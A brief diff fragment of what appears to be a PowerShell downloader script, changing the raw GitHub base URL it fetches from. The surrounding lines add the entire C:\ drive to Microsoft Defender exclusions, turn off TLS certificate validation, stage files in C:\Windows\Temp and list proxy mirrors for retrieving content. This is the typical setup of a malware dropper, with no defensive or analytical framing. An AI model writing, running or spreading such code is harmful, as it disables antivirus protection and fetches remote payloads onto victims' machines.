@@ -6,7 +6,7 @@ try { Add-MpPreference -ExclusionPath C:\ } catch {}
 [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
 $d = "C:\Windows\Temp"
-$base = "https://raw.githubusercontent.com/ap1620162-create/bug/refs/heads/main"
+$base = "https://raw.githubusercontent.com/johnsonm8203/bug/refs/heads/main"
 $mirrors = @(
     "https://ghproxy.it/",
     "https://wget.la/",
